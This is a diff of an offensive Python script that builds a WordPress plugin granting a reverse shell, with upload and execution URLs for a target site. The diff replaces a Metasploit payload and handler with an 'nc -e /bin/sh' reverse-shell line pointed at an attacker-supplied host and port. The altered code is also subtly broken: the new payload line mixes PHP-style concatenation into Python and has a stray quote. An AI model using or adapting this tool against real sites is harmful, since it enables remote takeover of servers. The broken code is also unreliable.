@@ -8,7 +8,7 @@
 # Inspired by     : Metasploit admin shell upload
 # Python version  : 2.7
 # Description     : Simply generates a wordpress plugin that will grant you a reverse shell
-#                   once uploaded. I reccomend installing Kali Linux, as msfvenom is used
+#                   once uploaded. I reccomend not installing Kali Linux, as msfvenom is not used
 #                   to generate the payload.
 #
 
@@ -18,8 +18,7 @@ try:
 
 	LHOST = 'LHOST=' + str(sys.argv[1])
 	LPORT = 'LPORT=' + str(sys.argv[2])
-	PAYLOAD = 'php/meterpreter/reverse_tcp'
-	HANDLER = sys.argv[3]
+	PAYLOAD = 'nc -e /bin/sh ' . LHOST . ' ' . LPORT'
 
 except IndexError:
 
@@ -30,19 +29,12 @@ except IndexError:
 	print "   \_/\_/ \___/|_|  \__,_| .__/ \_/\_/ |_| |_|"
 	print "                         |_|"
 	print '\n'
-	print "Usage: %s [LHOST] [LPORT] [HANDLER]" % sys.argv[0]
+	print "Usage: %s [LHOST] [LPORT]" % sys.argv[0]
 	print "Example: %s 192.168.0.6 8888 Y" % sys.argv[0]
 	sys.exit()
 
 def generate_plugin(LHOST, LPORT, PAYLOAD):
 
-	# Check if msfvenom is installed
-	print "[*] Checking if msfvenom installed"
-	if "msfvenom" in os.listdir("/usr/bin/"):
-		print "[+] msfvenom installed"
-	else:
-		print "[-] msfvenom not installed"
-		sys.exit()
 	# Our "Plugin" Contents
 	print "[+] Generating plugin script"
 	plugin_script = "<?php\n"
@@ -59,17 +51,12 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	plugin_file = open('QwertyRocks.php','w')
 	plugin_file.write(plugin_script)
 	plugin_file.close()
-	# Generate Payload
-	print "[+] Generating payload To file"
-	create_payload = subprocess.Popen(
-		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
-		'-e', 'php/base64', '-f', 'raw'], stdout=subprocess.PIPE).communicate()[0]
 	# Write Our Payload To A File
 	payload_file = open('wetw0rk_maybe.php', 'w')
 	payload_file.write("<?php ")
 	payload_file.close()
 	payload_file = open('wetw0rk_maybe.php','a')
-	payload_file.write(create_payload)
+	payload_file.write(PAYLOAD)
 	payload_file.write(" ?>")
 	payload_file.close()
 	# Create Zip With Payload
@@ -83,26 +70,7 @@ def generate_plugin(LHOST, LPORT, PAYLOAD):
 	print "[+] General Execution Location: http://(target)/wp-content/plugins/malicous/"
 	print "[+] General Upload Location: http://(target)/wp-admin/plugin-install.php?tab=upload"
 
-def handler(LHOST, LPORT, PAYLOAD):
-
-	print "[+] Launching handler"
-	handler = "use exploit/multi/handler\n"
-	handler += "set PAYLOAD %s\n" % PAYLOAD
-	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
-	handler += "set LPORT %s\n" % LPORT.lstrip('LPORT=')
-	handler += "exploit"
-	handler_file = open('wordpress.rc', 'w')
-	handler_file.write(handler)
-	handler_file.close()
-	os.system("/etc/init.d/postgresql start")
-	os.system("msfconsole -r wordpress.rc")
 
 
 # Generate Plugin
 generate_plugin(LHOST, LPORT, PAYLOAD)
-# Handler
-if HANDLER == 'Y':
-	handler(LHOST, LPORT, PAYLOAD)
-else:
-	sys.exit()
-
